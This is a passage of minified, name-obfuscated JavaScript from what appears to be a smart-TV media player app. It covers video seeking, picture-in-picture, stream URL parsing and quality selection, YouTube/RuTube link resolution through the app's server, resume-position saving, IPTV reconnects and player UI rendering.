qch_num=""},1300);qch_num=qch_num+per/10;kjtYpr.popUp("Open channel: "+qch_num,1500,"on",!0)}else c.setSeek(Math.ceil((per/100)*c.getTotal()),per)},setSeek:function(position,per){var c=this;if(adsPage.state()&&!lQ0O0lOIxJXRI0OOYpr())return!1;gl_buf=0;c.iptv_retry=0;if(c.is_arc){$_("arrowtime").style.display="block";var xt=T.timestamp+c.arc_fwd+position;var tt=gV(c.playElement,"catchup_days")*24*3600;var pos=Math.ceil(((tt+c.arc_fwd+position)/tt)*c.barWidth());c.setPosition(pos);$_('arrowtime',dt(xt,!0,!0))}else{c.totalTime=vPlayer.getTotal();if(position<0)position=0;if(position>=0&&position<c.totalTime){var pos=Math.ceil((position/c.totalTime)*c.barWidth());if(!c.arc_fwd)c.setPosition(pos);$_("arrowtime").style.display="block";if(per)$_('arrowtime',per+"%");else $_('arrowtime',getTimeFromMS(position))}}
c.arrowSet(pos);clearTimeout(c.wdtimer);c.wdtimer=setTimeout(function(){c.seek(position)},1200)},frw:function(sec){var c=this;if(adsPage.state()&&!lQ0O0lOIxJXRI0OOYpr())return!1;var x=Math.abs(c.glSec);if(Math.abs(sec)==1){if(x>100)var t=60;else if(x>60)t=25;else t=10;t*=sec}else t=sec;c.glSec+=t;c.setSeek(vPlayer.getCur()+c.glSec)},stream:{stoPip:function(){if(this.setptimer){this.setptimer=0;clearTimeout(this.ptimer)}},playPip:function(el){el=el||lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(curCh()));if(el.stream_url){el.mini=1;vPlayer.stream.create(el)}},setPip:function(el,m){var c=vPlayer;var elCh=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(el));c.curTime=0;this.stoPip();if(handler!="menu"||c.minimize||(c.lastident==getIdent(elCh.index)))return;var url=String(elCh.stream_url);if(!url||url.match(/\.torrent$/)||url.match(/^(torrent|magnet|cmd)/))return;if(url.match(/(\/|md5hash)/)){c.setLoading("off");if(m){if(elCh.index==getSelect()&&handler=="menu"){vPlayer.stream.playPip(elCh)}}else{this.setptimer=1;this.ptimer=setTimeout(function(){c.stream.setPip(elCh,1)},2500)}}},create:function(elCh){var c=vPlayer;c.arc_fwd=0;vPlayer.setStart=0;vPlayer.infolink=gVs(elCh,"infolink");var ar=["parser","parser2","mb_parser"];for(tag in ar){if(elCh[ar[tag]]){var params={"ch":elCh,"pq":{},"tag":ar[tag]};params.callback=function(a_pq){c.stream.setPip(a_pq.elCh,1)}
return FXMLPage.lI1QlIlO1zHuo1001Ypr(params)}}
elCh.url=elCh.url||elCh.stream_url.replace(/\\\//g,"/");c.stream.stoPip();if(!c.stopped)c.player().stop();if(c.audio.played())c.audio.stop();if(c.audio.played()){$_("vk_audio").style.zIndex="-2";$_("vk_audio").style.display="none";$_("vk_play_button").style.display="block";c.audio.stop()}
c.lastident=elCh.ident=getIdent();if(elCh.url=="description")return c.description();if(elCh.url.indexOf("/hls/userencrypt/")>0){elCh.url=parse_urlm(elCh.url)}
if(handler=="player")c.renderPlayer();if(!this.urlHelper(elCh))is_loadpage(-1)},urlHelper:function(elCh){var c=vPlayer;var url=elCh.url,itemid;if(url.indexOf("=postmd5")>0){if(elCh.postmd5)url=sU(url,"#POSTpostmd5="+encodeURIComponent(elCh.postmd5));else return kjtYpr.inf("_FPOshibka_ _FPparsingaVideossilki_! Empty POST",2000)}
if(url.indexOf("#POST")>0){uHelper.create("direct|rf|proxy").getI(url).parse=function(s){elCh.url=s;c.llll1Zvc0cl1QllOYpr(elCh)}}else if((itemid=url.match(/(?:youtube\.com\/|youtu\.be\/).*?(?:v=|\/)([a-zA-Z0-9_-]{11})/))||(itemid=url.match(/rutube\.ru\/.*?embed\/([a-zA-Z0-9_-]+)/))){video_id=itemid[1];platform=url.indexOf("youtube")!==-1||url.indexOf("youtu.be")!==-1?"youtube":"rutube";maJor.statusbar(url,"link");var ser=maJor.timestamp>=3?"":Math.random()>0.5?4:3;var u="http://exec"+ser+".remotecurl.appfxml.com/curl/yt-dlp.php?do="+platform+"&v="+video_id;uHelper.create("directnoheader").getI(u).parse=function(s){var m=lIlI1VBOOlI01QYpr(s);if(m){elCh.json_url=m;c.l00I1OINreI011Ypr(elCh)}else{c.lll0Q10I0lI1O0Oll0OOYpr();kjtYpr.inf(platform.charAt(0).toUpperCase()+platform.slice(1)+" err "+s,1300);is_loadpage(-1)}}}else c.llll1Zvc0cl1QllOYpr(elCh);return 1}},l00I1OINreI011Ypr:function(elCh){var c=this;try{var k=0,dop="",use_auto=0;var json_select=c.elState.get("json_select");var qual=maJor.sQual[maJor.params.get('quality')];if(elCh.json_url.auto){var kpm=elCh.openwith||maJor.params.get('streamplayer');if(kpm=="jw")use_auto=1}
if(json_select){if(elCh.json_url&&elCh.json_url[json_select]){k=json_select;if(gVs(elCh.json_url[k],"audio").indexOf("http")==0)dop="#AUDIO="+elCh.json_url[k].audio;c.playElement.json_select=json_select}}else for(var i in elCh.json_url){if(gV(elCh.json_url[i],"audio")=="")elCh.json_url[i].audio="1";if(gV(elCh.json_url[i],"title")=="")elCh.json_url[i].title=i;if(use_auto&&i=="auto")k=i;else if(k!="auto"&&parseInt(i)>k&&i<(qual+40))if(elCh.json_url[i].audio=="1"||elCh.json_url[i].audio=="")k=i}
if(k==0){k=10000;for(var i in elCh.json_url){if(use_auto&&i=="auto")k=i;else if(k!="auto"&&parseInt(i)<k&&i>qual-40)if(elCh.json_url[i].audio=="1"||elCh.json_url[i].audio=="")k=i}
if(k==10000){for(var i in elCh.json_url){if(use_auto&&i=="auto")k=i;else if(k!="auto"&&parseInt(i)<k&&i>qual-40)k=i}
if(k==10000)k=0;if(gVs(elCh.json_url[k],"audio").indexOf("http")==0)dop="#AUDIO="+elCh.json_url[k].audio}}
elCh.url=elCh.json_url[k].url;if(elCh.json_url[k].infolink){c.infolink=elCh.json_url[k].infolink}
if(elCh.json_url[k].subtitles){elCh.subtitles=elCh.json_url[k].subtitles}
if(dop){if(typeof elCh.url=="object"){for(var i in elCh.url){elCh.url[i]+=dop}}else elCh.url+=dop}
c.llll1Zvc0cl1QllOYpr(elCh)}catch(e){vPlayer.lll0Q10I0lI1O0Oll0OOYpr();kjtYpr.inf("Err format json link: "+e.message,1500);is_loadpage(-1)}},retryNum:function(){var c=this,n=4;if(typeof c.playElement.url=="object"&&c.playElement.url.length){var n=c.playElement.url.length}
if(n<4)n=4;return n},streamnum:function(url,m){var c=this;if(typeof url=="object"&&url.length){var n=c.playElement.stream_num||0;if(m)n++;if(!url[n])n=0;c.playElement.stream_num=n;return url[n]}
return url},getSaveTime:function(){var ident=gV(vPlayer.playElement,"ident");if(!ident||!maJor.ftimes||adsPage.state())return;try{if(maJor.ftimes[ident]){if(maJor.ftimes[ident][0]<30||(maJor.ftimes[ident][1]<150&&pstream&&!is_vod()))return;vPlayer.l0QOOILTvlIO0O1Ypr=maJor.ftimes[ident][0];$_("vrecovery").style.display=$_("playerBottom").style.display;$_("vrecovery","_FPVozobnovitNa_<br>["+getTimeFromMS(vPlayer.l0QOOILTvlIO0O1Ypr)+"]")}else if(gV(vPlayer.playElement,"start_time")>0){vPlayer.l0QOOILTvlIO0O1Ypr=vPlayer.playElement.start_time;$_("vrecovery").style.display=$_("playerBottom").style.display;$_("vrecovery","_FPVozobnovitNa_<br>["+getTimeFromMS(vPlayer.l0QOOILTvlIO0O1Ypr)+"]")}else if(allTimes[ident]){vPlayer.l0QOOILTvlIO0O1Ypr=allTimes[ident][0];$_("vrecovery").style.display=$_("playerBottom").style.display;$_("vrecovery",allTimes[ident].d+"<br>["+getTimeFromMS(vPlayer.l0QOOILTvlIO0O1Ypr)+"]")}}catch(e){}},SaveTime:function(mode){var c=this;try{var ident=gV(c.playElement,"ident");if(c.audio.played()||c.is_mini()||!ident||adsPage.state()||l0lIl1lTqx011IYpr=="image"||(pstream&&!is_vod()&&(c.getTotal()<150||c.getTotal()>11*3600)))return;var limit_arr=200;if(maJor.platform()=="maple"||maJor.platform()=="android-device"||maJor.platform()=="tizen")limit_arr=1000;if(gV(mode)=="andr"){c.curTime=3;c.totalTime=3}else{c.curTime=vPlayer.getCur();c.totalTime=vPlayer.getTotal()}
if(c.curTime>2&&c.totalTime>0){maJor.ftimes=maJor.ftimes||{};try{var st=0,id=null,len=0;for(var i in maJor.ftimes){if(maJor.ftimes[i][2]<st||st==0){id=i;st=maJor.ftimes[i][2]}
len++}
if(len>limit_arr)delete maJor.ftimes[id];if(maJor.ftimes[ident]){if(c.curTime>maJor.ftimes[ident][0]||c.totalTime-maJor.ftimes[ident][0]<40)maJor.ftimes[ident][0]=c.curTime;maJor.ftimes[ident][1]=c.totalTime;maJor.ftimes[ident][2]=Math.ceil(T.inetTime/10000000)}else maJor.ftimes[ident]=[c.curTime,c.totalTime,Math.ceil(T.inetTime/10000000)];maJor.write("times",l1OOl0I0IASY10lQ10Ypr(maJor.ftimes))}catch(e){}}}catch(e){kjtYpr.popUp("Ошибка сохранения позиции видеофайла: "+e.message,500)}},easystop:function(onlystop){var c=this;c.stopped=!0;$_("loading").style.display="none";if(handler=="player")lll1IlIlOBP_II1lYpr();c.deletePauseOverlay();if(c.playElement&&gV(c.playElement.event,"onstopvideo")){var myImage=new Image(1,1);var u=c.videoevents(gVs(c.playElement.event,"onstopvideo"));myImage.src=maJor.addident(u)}
c.player().stop();c.curTime=-1;c.totalTime=0;$_("prekinfo").style.display="none";$_("arrowtime").style.display="none";if(c.sound)c.sound.src=null;if(c.playUrlAudio){$_("other","");c.playUrlAudio=""}
adsPage.state(0);c.l1I0Ilty1w01O1IIYpr=0;vPlayer.lIl0II1OOluuB0IO0OYpr=0;vPlayer.lIl0II1OOluuB0IO0OYprQualIndex=0;c.pos[0]=1;c.chvr=1;clearTimeout(c.lifeTimer);c.stream.stoPip();if(c.player().onstop){c.player().onstop();c.player().onstop=null}
if(onlystop)return;sendr=!0;c.iptv.arc.timestamp=0;c.subtitles.clear();c.iptv_succed=0;$_("popUp").style.display="none";clearTimeout(c.loaderTimer);clearTimeout(c.endTimer);clearTimeout(c.timeoutWork);$_("ptt","")},minimize:0,minimizeplayer:function(mode){var c=this;c.minimize=mode;if(mode){c.hidePlayer(!0);$_("main").style.display="block";$_("main").style.zIndex="4";$_("main").style.background="none";$_("main").style.opacity="0.9";maJor.setHandler("menu");linkOver();set_times()}else{$_("main").style.display="none";$_("main").style.zIndex="0";FXMLPage.l1I1IQlO1ZkV1IOOOllYpr();$_("main").style.opacity="1";handler="player"}},lll0Q10I0lI1O0Oll0OOYpr:function(noforce){var c=this;if(c.curTime>900)maJor.lastShowQR=0;if(!c.stopped){c.SaveTime();c.easystop()}
c.elState.set("reset");c.stream.stoPip();c.player().exit();maJor.sethash();lll1IlIlOBP_II1lYpr();sendr=!0;c.iptv_succed=0;c.curTime=-1;totalTime=0;c.PLINDEX=-1;kjtYpr.inf("",1);flashmode=null;clearTimeout(c.loaderTimer);clearTimeout(c.timerF);clearTimeout(c.endTimer);clearTimeout(c.timeoutWork);clearTimeout(c.lifeTimer);clearTimeout(c.reconectVideo);kjtYpr.inf("");$_("chat","");$_("epg_full","");var curPage=gPL();if(!curPage)return;if(curPage.lO10111O0001lOl00Ypr.indexOf("extensions://")==0){$_("ext").style.display="block";$_("frame-id").contentWindow.postMessage({'cmd':'focus','text':''},"*")}
if(noforce&&handler=="menu")return;if(c.minimize)c.minimizeplayer(!1);is_loadpage(0);if(!noforce){if(Math.random()>0.4&&$_("player").style.display=="block"&&!adsPage.state()){if(maJor.platform().match(/maple|sony|pa|mag/)&&Math.random()>0.62)kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> _FPBlueKnProporcii_");else{if(curPage.is_iptv>2){if(Math.random()>0.6)kjtYpr.popUp("_FPNpl1I0lOOIQkBvOOlOYpr_?<br> <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPVmEmVp_");else kjtYpr.popUp("_FPNpl1I0lOOIQkBvOOlOYpr_?<br>_FPVoVremProsNazh_ <span style='background-color:orange;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPdVp_. ")}else if(Math.random()>0.6)kjtYpr.popUp("_FPVmVpostBiCe_ "+((pstream)?"IPTV":"_FPVi"+"deo_")+" _FPpleer_а <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_ -> HTML5 _FPpleer_ / _FPVstroenniy_</i>");else kjtYpr.popUp("_FPHotChtVfon_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPvVrPrVid_</i>");if(Math.random()>0.3)kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /> _FPKnInfoPerRezh_")}}
c.player().stop()}
c.setLoading("off",Math.random());maJor.setHandler("menu");maJor.each("popUp|subtitle|chat|QualCh|player|other|jw|vrecovery|bcg1|bcg2|playermini|whitestripes1|whitestripes2|video".split("|"),function(v){if($_(v))$_(v).style.display="none"});$_("main").style.display="block";if(gP("is_iptv")>2)fEpg.jsc(null,"notimer");(gP()||FXMLPage).l1I1IQlO1ZkV1IOOOllYpr();c.playElement=null;Il01QllQll().focused();set_times()},endvideo:function(is_android){var c=this;clearTimeout(c.endTimer);if(c.is_mini())return;if(c.audio.played()){if(c.audio.vk_repeat)c.audio.play(null,c.audio.sel);else c.audio.play(null,++c.audio.sel);if(c.audio.vk_visual){kjtYpr.popUp(this.pl[this.sel].description,1500)}}else if(adsPage.state()){adsPage.endrek();if(maJor.platform()=="android-device")c.lll0Q10I0lI1O0Oll0OOYpr();else c.easystop();adsPage.llll1Zvc0cl1QllOYpr()}else if(is_android){c.SaveTime("andr");if((pstream&&!is_vod(c.playUrl))||maJor.params.get('next')<=0)c.lll0Q10I0lI1O0Oll0OOYpr();else{c.showPlayer();kjtYpr.popUp("Нажмите Назад или закройте видео для отмены действия <b>"+sNext[maJor.params.get('next')]+"</b> через 5сек.",5000,"on");c.timerF=setTimeout(function(){c.endvideo()},5000)}}else{c.SaveTime();var pNext=maJor.params.get('next');if(pNext!=4){if(pstream&&!is_vod(c.playUrl))return;else if(pNext==2){c.easystop();c.l1100OlxlQQ00lO0Ypr(c.playUrl)}else if(pNext==1&&(getSelect()+1)<gP().channels.length&&gP().channels[getSelect()+1].stream_url)vPlayer.lll110IjuIxI11IIYprNext(1);else if(pNext==3)vPlayer.lll110IjuIxI11IIYprNext(1);else c.lll0Q10I0lI1O0Oll0OOYpr()}}},is_mini:function(){var c=vPlayer;if(c.playElement&&c.playElement.mini){if(c.getTotal()||c.getCur())return 2;else return 1}else return 0},lifeSec:-1,lifeN:0,lifeTimer:null,lastSec:-1,loaderTimer:null,setLoading:function(mode,sec){var c=this,timer;clearTimeout(c.loaderTimer);if(l0lIl1lTqx011IYpr=="jw"||c.stopped){$_("loading").style.display="none";return}
if(c.is_mini()){$_("loading").style.left="79%";$_("loading").style.top="75%"}else{$_("loading").style.left="50%";$_("loading").style.top="45%"}
if(mode=="on"){if(sec)c.lastSec=sec;if(handler=="menu"&&!vPlayer.is_mini())return;$_("loading").style.display="block";if(l0lIl1lTqx011IYpr=="media"&&maJor.platform().match(/lg/)&&maJor.series!="LW")timer=25000;else if(maJor.platform().match(/tizen|maple|android-device/))timer=maJor.params.get("timeoutiptv")*1000;else if(maJor.platform()=="mag")timer=60000;else if(pstream||l0lIl1lTqx011IYpr=="media"||l0lIl1lTqx011IYpr=="ext")timer=1500;else timer=10000;c.loaderTimer=setTimeout('$_("loading").style.display="none";',timer)}
if(mode=="off"&&($_("loading").style.display!="none"||l0lIl1lTqx011IYpr=="image")&&c.lastSec!=sec){$_("loading").style.display="none";c.triggerHide(900,!0)}},l111I1I0Y1Z0llIOYpr:function(){var c=this;if(gP("is_iptv")>2||(!is_vod(c.playElement.url)&&pstream)){c.lifeTimer=setTimeout("vPlayer.l111I1I0Y1Z0llIOYpr();",1200);if(c.stopped||c.paused||$_("loading").style.display=="block")return;if(maJor.params.get("timeoutiptv")>55)return;c.curTime=c.getCur();if(c.iptv_succed||c.curTime>0||(c.curTime==0&&maJor.platform().match(/lg/)&&maJor.series!="LW")){if(c.curTime!=c.lifeSec){c.lifeN=0;c.lifeSec=c.curTime}else{c.lifeN++;if(ttmac)kjtYpr.popUp("lifeN"+c.lifeN,1000);if(c.lifeN>12&&c.lifeN>maJor.params.get("timeoutiptv")*1.2){c.eventerrvideo()}}}}},rekLife:function(){var c=this;if(l0lIl1lTqx011IYpr=="image"||!adsPage.state())return;c.lifeTimer=setTimeout("vPlayer.rekLife();",1000);if(!c.paused){c.curTime=c.getCur();if(c.curTime!=c.lifeSec){c.lifeN=0;c.lifeSec=c.curTime}else{c.lifeN++;if(c.lifeN>5){if(ttmac)kjtYpr.popUp("REK END LifeN "+c.lifeN);c.lifeN=0;c.lifeSec=-1;if(c.curTime<1)adsPage.err_rek("errreklifeend0");else adsPage.err_rek("errreklifeend")}}}},eventerrvideo:function(event){var c=vPlayer;if(event&&event.message)var textError=event.message;else textError="";if(c.is_mini()){c.lll0Q10I0lI1O0Oll0OOYpr();maJor.statusbar("Error open video "+textError,"err")}else if(adsPage.state()>1)adsPage.err_rek("errloadfile"+maJor.platform());else{if(handler=="menu"||adsPage.state())return;if(c.getCur()==0)gP().sendStat(0);if(maJor.params.get("timeoutiptv")>55)return;if((!pstream||is_vod(c.playUrl))&&c.getCur()>0){c.reconectVideo=setTimeout(function(){c.easystop();c.renderPlayer();c.l1100OlxlQQ00lO0Ypr(c.playUrl,c.getCur())},2500);c.l1O0Ol1iOVI0O1Ypr("_FPSoedineniePrervano_!"+c.getCur()+c.playUrl)}else{c.iptv_retry++;if(pstream&&!is_vod(vPlayer.playUrl)&&c.iptv_succed){c.easystop(1);c.renderPlayer();setTimeout(function(){c.l1100OlxlQQ00lO0Ypr(c.playUrl)},500);c.l1O0Ol1iOVI0O1Ypr("_FPOshibka_! _FPPodkluchenie_ "+c.iptv_retry+"...")}else if(c.iptv_retry>=c.retryNum()){c.lll0Q10I0lI1O0Oll0OOYpr();maJor.statusbar("off")}else{if(handler=="player"){lifeN=0;lifeSec=-1;c.setLoading("on");c.easystop(1);c.renderPlayer();c.playUrl=c.streamnum(c.playElement.url,1);maJor.statusbar(c.playUrl,"link",1);c.l1100OlxlQQ00lO0Ypr(c.playUrl);c.l1O0Ol1iOVI0O1Ypr("_FPOshibka_ _FPpodklucheniya_! _FPPodkluchenie_  "+(c.iptv_retry+1)+"...")}}}}},sound:null,soundn:0,audioplay:function(url){var c=this;if(url.indexOf("http")!=0||!c.playUrlAudio)return;try{c.sound=new Audio(c.playUrlAudio);c.sound.addEventListener("error",function(e){kjtYpr.popUp("Audio err: "+e.currentTarget.error.code,500);if(e.currentTarget.error.code>1&&e.currentTarget.error.code<4){c.sound=null;clearTimeout(c.soundt);c.soundt=setTimeout("vPlayer.audioplay(vPlayer.playUrlAudio);",1500)}});c.sound.load();c.sound.addEventListener('loadedmetadata',function(){if(!c.stopped){c.soundn=2;c.sound.currentTime=c.getCur();c.sound.play()}},!1)}catch(e){kjtYpr.popUp("Not support js audio<br>"+e.message,1200)}},qualClose:function(){$_("QualCh").style.display="none";handler="player";vPlayer.triggerHide(2000)},renderPlayer:function(pe){var c=this;var pe=pe||c.playElement||{};if(pe.mini)return;handler="player";$_("main").style.display="none";$_("QualCh").style.display="none";$_("player").style.display="block";$_("vrecovery","");if(maJor.platform()=="android-device"){if(l0lIl1lTqx011IYpr.match(/html5|playerjs|image|jw/))$_("player").style.backgroundColor="transparent";else $_("player").style.backgroundColor="black"}
$_("jw").style.zIndex="0";if(l0lIl1lTqx011IYpr=="download")var pstr="...";else if(maJor.sIconPlayer[l0lIl1lTqx011IYpr])pstr="<img id='ico_p' class='p_info' style='margin-top: -1px;' align='center' height='21' src='"+_img("_ST_"+maJor.sIconPlayer[l0lIl1lTqx011IYpr])+"' />";else pstr="";$_("typeP",pstr);var url=c.streamnum(pe.url||pe.stream_url||"");if(url.indexOf("md5hash")>=0)url=pe.parser||"";$_("infR","");$_("infPl","");c.getSaveTime();c.resolution="";$_("infoResolution","");$_("remainingTime","");$_("totalTime","");if(pe.playlist&&pe.playlist.length){var dopnum="<br><span style='font-size:80%;'>"+(c.PLINDEX+1)+"/"+(pe.playlist.length)+"</span>"}else dopnum="";$_("movTitle",(gVs(pe,"label")||pe.title)+"<span id='epgTitle' style='font-weight: normal;color:#FFEB3B;'></span>");url=c.infolink||getInfoUrl(url);$_("info_right",url.replace(/^(.{12}).*(.{14})$/,"$1...$2"));$_("ptt","<div id='info_num' style='float:left;text-align: center;width: 5.68%;font-size:28px;padding-top: 4px;word-wrap: break-word;'>"+(parseInt(pe.index)+1)+"."+dopnum+"</div>"+"<div style='height: 142px;line-height: 142px;margin-top: -36px;float: left;width:7.7%;'><img src='"+(gVs(pe,"poster")||gVs(pe,"preview")||gVs(pe,"logo_30x30"))+"' onerror='this.style.visibility=\"hidden\";' style='margin-top: 0px;background: #474747;max-width: 100%;max-height: 120px;vertical-align: middle;'></div>");if(!fEpg.inPlayer()){var videoinfo=gVs(pe,"information")||gVs(pe,"description").replace(/<[^b].*?>/g,"")||(pe.label&&pe.title)||"_FPNo information_";$_("epg_full","<div id='infovideo' style='color: #d5d4d4;'>"+videoinfo+"</div>")}
c.init()},st:{},elState:{get:function(e){return vPlayer.st[e]},set:function(e,v){var c=vPlayer;if(e=="reset")c.st={};else if(e=="save"){if(c.playElement){this.set("sub_sel",c.playElement.sub_sel);this.set("json_select",c.playElement.json_select);this.set("state",1);if(c.player().subtitle&&c.player().sub_sel){this.set("mkv_sub_sel",c.player().sub_sel)}else this.set("mkv_sub_sel",0);if(c.player().audioTracks&&c.player().audioTracks()&&c.player().audioTracks().sel){this.set("mkv_audio",c.player().audioTracks().sel)}else this.set("mkv_audio",0)}else this.set("reset")}else c.st[e]=v}},lll110IjuIxI11IIYprNext:function(m){var c=this;c.elState.set("save");if(c.playElement.playlist){c.PLINDEX+=m;if(c.PLINDEX<-1)c.PLINDEX=c.playElement.playlist.length-1;if(c.PLINDEX>=0){var ch=c.playElement.playlist[c.PLINDEX];ch.playlist=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(c.playElement.playlist));c.easystop();Il01QllQll().navigate(ch,c.playElement.openwith);return}}
setSelect(parseInt(c.playElement.index)+m);if(curCh("stream_url")){c.easystop();curCh().mini=0;Il01QllQll().navigate(curCh(),c.playElement.openwith)}else c.lll0Q10I0lI1O0Oll0OOYpr()},arrurl:function(u){var c=this;var url="";try{var z=lIlI1VBOOlI01QYpr(u);if(z){c.playElement.url=z;url=c.streamnum(c.playElement.url)}}catch(e){kjtYpr.inf("Error format object{} stream url. Must be {\"720\":{\"url\":\"\",\"title\":\"\"}}",2000)}
return url},videoevents:function(u){var c=this;return u.replace("[index]",gVs(c.playElement,"index")).replace("[item]",encodeURIComponent(l1OOl0I0IASY10lQ10Ypr(c.playElement))).replace("[item]",encodeURIComponent(l1OOl0I0IASY10lQ10Ypr(c.playElement))).replace("[curTime]",c.curTime).replace("[totalTime]",c.totalTime).replace("[xmlurl]",encodeURIComponent(gP("lO10111O0001lOl00Ypr"))).replace("[count]",(gP("channels")||"").length)},l1100OlxlQQ00lO0Ypr:function(url,start){var c=this;url=String(url);c.audioCur=0;if(start)c.setStart=0;try{var curPage=gP();is_loadpage(0);if(url=="description"){plDesc=0;$_("loading").style.display="none";$_("infPl","TEXT");c.playUrl=url;c.paused=!1;video.style.display="none";$_("jw").style.display="block";var b="<div style='background-color:#0f172a;padding:15px;height:100%;background-image:url("+getFon(maJor.params.get("fon"))+"); background-size:cover;'>"+vPlayer.playElement.description+"</div>";$_("jw",b);maJor.statusbar("off");return}else adsPage.rekBox();try{if(url.indexOf("sess-")>0)url=url.replace(/\/sess-.{38}\//,"/videos/");if(maJor.params.get("udp")){if(url.indexOf("udp://")==0)
url=url.replace("udp://@","http://"+maJor.params.get("udp")+"/udp/").replace("udp://","http://"+maJor.params.get("udp")+"/udp/");if(url.indexOf("rtp://")==0)
url=url.replace("rtp://@","http://"+maJor.params.get("udp")+"/rtp/").replace("rtp://","http://"+maJor.params.get("udp")+"/rtp/")}
if(url.indexOf("acestream://")==0)url="http://"+getip("acestream")+"/ace/manifest.m3u8?id="+url.replace("acestream://","")+"";if(url.indexOf("#AUDIO=")>0){c.playUrl=url.split("#AUDIO=")[0];c.playUrlAudio=url.split("#AUDIO=")[1];c.audioplay(c.playUrlAudio)}else c.playUrl=url;c.end_ok=!1;c.curTime=0;if(url.indexOf("/dtv/usb/")==0){url=url.replace("$USB_DIR/")}else if(url.indexOf("/")==0&&maJor.platform()=="android-device"&&!l0lIl1lTqx011IYpr.match(/manual|media|vimu/)){}else if(url.indexOf("/")==-1){c.lll0Q10I0lI1O0Oll0OOYpr();kjtYpr.inf("_FPNevernayaSsilka_",1200);return}
if(!adsPage.state()){clearTimeout(c.timeoutWork);c.timeoutWork=setTimeout(function(){if(c.curTime<1&&!c.totalTime)gP().sendStat(0)},28000)}
maJor.sethash(c.playUrl);c.stopped=0;c.paused=0;c.iptv_succed=0}catch(e){jsshowErr("Prepare video error: "+e.message+" "+url,1)}
if(c.playElement&&gV(c.playElement.event,"onstartvideo")){var myImage=new Image(1,1);var u=c.videoevents(gVs(c.playElement.event,"onstartvideo"));myImage.src=maJor.addident(u)}
if(maJor.platform()=="android-device"&&l0lIl1lTqx011IYpr.match(/manual|media|vimu/)){if(maJor.build>=7){var ex={"type":"video","player":l0lIl1lTqx011IYpr,"header":{},"title":gV(c.playElement,"title"),"url":url};if(fEpg.epgInDesc())ex.title=$_("epg_full").innerHTML.replace(/<br>/g,"\n").replace(/<.*?>/g,"");andr.exec(l1OOl0I0IASY10lQ10Ypr(ex))}else{andr.cmd("video"+url)}}else{try{c.fst=!0;c.setWhitestripes();if(c.playUrl.indexOf("//")===0)c.playUrl="http:"+c.playUrl;c.player().start(c.playUrl,start);if(c.elState.get("sub_sel")){c.playElement.sub_sel=c.elState.get("sub_sel");c.subtitles.lO011IIO1olgIZIOIIOIYpr()}}catch(e){jsshowErr("Play error start: "+e.message+" "+url,-1)}}}catch(e){jsshowErr("Play error: "+e.message+" "+url,2)}},llll1Zvc0cl1QllOYpr:function(pe){var c=this;c.playElement=pe;if(c.vPlayElement)c.lastPlayElement=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(c.vPlayElement));c.vPlayElement=lIlI1VBOOlI01QYpr(l1OOl0I0IASY10lQ10Ypr(c.playElement));adsPage.state(0);Il01QllQll().stopLoad();var url=c.streamnum(c.playElement.url);if(!url){kjtYpr.popUp("_FPPustayaSsilka_");c.lll0Q10I0lI1O0Oll0OOYpr();return}
try{$_("epg_full","");if(url.indexOf("[")==0)url=c.arrurl(url);else if(url.indexOf("{")==0){c.playElement.json_url=lIlI1VBOOlI01QYpr(url);if(c.playElement.json_url)c.l00I1OINreI011Ypr(c.playElement);else kjtYpr.inf("Error JSON decode stream url. Must be {\"720\":{\"url\":\"\",\"title\":\"\"}}",1800);return}else if(url.indexOf("NotFound")==0){return}
if(url.indexOf("[")==0)url=c.arrurl(url);if(is_m3u8(url))pstream=!0;else pstream=!1;maJor.statusbar((c.infolink||url),"link");if(!c.playElement.openwith){if(url.indexOf("#playerjw")>0){url=url.replace("#playerjw","");if(!c.jw.exis())kjtYpr.popUp("<b>Это видео требует JW плеер! </b>Нет поддержки JW плеера вашим устройством!",3500);else l0lIl1lTqx011IYpr="jw"}else if(url.indexOf("#playerjs")>0){url=url.replace("#playerjs","");l0lIl1lTqx011IYpr="playerjs"}else if(url.indexOf("#media")>0){l0lIl1lTqx011IYpr="media";url=url.replace("#media","")}else if(is_img(url)||gV(c.playElement,"type")=="img")l0lIl1lTqx011IYpr="image";else l0lIl1lTqx011IYpr=(pstream)?maJor.params.get('streamplayer'):maJor.params.get('player')}else l0lIl1lTqx011IYpr=c.playElement.openwith;c.playUrl=url;c.setPosition(0);if(!c.player().exis()){maJor.statusbar(l0lIl1lTqx011IYpr+" _FPplayer not loaded or not supported on your device! Change type player in Settings or restart app_","error");maJor.setHandler("menu");return}
optLangSel=0;if(l0lIl1lTqx011IYpr=="image")c.hidePlayer();else{c.showPlayer();$_('progressBut').style.display='none';$_("progressBuffer").style.width="0px";$_("progressBarStatus").style.width='0px';$_('progressBut').style.left="-9px";$_("remainingTime","");$_("totalTime","")}
vPlayer.pos[1]=1;c.setFocus(0);c.subtitles.parse();clearTimeout(c.lifeTimer);info_mode=0;c.iptv_retry=0;if(gP("is_iptv")>2||(!is_vod(url)&&pstream)){lifeN=0;lifeSec=-1;c.lifeTimer=setTimeout("vPlayer.l111I1I0Y1Z0llIOYpr();",2000)}
if(c.playElement.catchup||c.playElement.catchup_days){c.is_arc=1;c.playElement.catchup=c.playElement.catchup||"default"
c.playElement.catchup_days=c.playElement.catchup_days||3;if(c.playElement.arcCurTime){c.iptv.arc.timestamp=parseInt(c.playElement.arcCurTime);c.arc_fwd=c.iptv.arc.timestamp-T.timestamp}}else c.is_arc=0;c.renderPlayer();c.l1100OlxlQQ00lO0Ypr(url);c.triggerHide();c.setLoading("on");c.getSaveTime()}catch(e){kjtYpr.popUp("Err Play media:<br>"+e.message);c.l1100OlxlQQ00lO0Ypr(url)}},gl_position:0,setPosition:function(pos){var c=this;c.gl_position=pos;$_("progressBut","");if(pos>c.barWidth())pos=c.barWidth();if(pos<=6){$_("progressBarStatus").style.width='6px'}else{$_("progressBarStatus").style.width=pos+'px'}
